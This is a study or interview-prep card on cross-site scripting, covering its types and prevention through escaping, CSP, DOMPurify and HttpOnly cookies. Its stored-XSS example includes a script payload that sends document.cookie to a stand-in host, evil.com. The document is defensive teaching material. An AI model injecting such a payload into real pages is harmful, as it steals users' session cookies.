---
title: "What is Cross-Site Scripting (XSS) and how do you prevent it?"
category: security
subcategory: web
tags: [xss, security, injection, csrf, sanitization]
difficulty: pleno
lang: en
---

## Full Answer

**Cross-Site Scripting (XSS)** is a vulnerability where an attacker injects malicious scripts into web pages viewed by other users. The injected script runs in the victim's browser with the same privileges as the legitimate site — it can steal cookies, tokens, or perform actions on behalf of the user.

**Types of XSS**

1. **Stored XSS** — malicious script is saved in the database (e.g., in a comment) and served to every user who views that content. Most dangerous.

2. **Reflected XSS** — script is embedded in a URL parameter. The server reflects it back in the response without sanitizing. Requires tricking the user into clicking a crafted link.

3. **DOM-based XSS** — script is injected and executed entirely in the browser via client-side JavaScript (e.g., `document.innerHTML = location.hash`). Server is not involved.

**Example (Stored XSS):**
```html
<!-- Attacker submits this as a comment -->
<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>

<!-- Server stores it and renders it for every user -->
<div class="comment"><script>fetch('https://evil.com/steal?c=' + document.cookie)</script></div>
```

**Prevention**

1. **Escape output** — HTML-encode user-supplied data before inserting it into HTML. `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`. Modern frameworks (React, Vue, Angular) do this automatically when using template syntax.

2. **Never use raw HTML injection** — avoid `innerHTML`, `dangerouslySetInnerHTML` (React), `v-html` (Vue) with untrusted input.

3. **Content Security Policy (CSP)** — HTTP header that restricts which scripts can run. A strict CSP blocks inline scripts and limits sources:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

4. **Sanitize rich text** — if you must allow HTML (e.g., WYSIWYG editors), use a trusted library like DOMPurify to strip dangerous tags before rendering.

5. **HttpOnly cookies** — mark session cookies as `HttpOnly` so they cannot be accessed by JavaScript, limiting the damage if XSS occurs.

## Quick Answer

XSS is injecting malicious scripts into pages seen by other users. Prevention: escape all user output (frameworks do this by default), avoid `innerHTML` with untrusted data, use Content Security Policy headers, and mark session cookies as `HttpOnly`.

## Flashcard

**Q:** What is XSS and what is the primary prevention technique?

**A:** XSS (Cross-Site Scripting) — attacker injects scripts into pages viewed by others, running with site privileges. Primary prevention: escape all user-supplied output before rendering as HTML. Also use CSP headers and `HttpOnly` cookies.
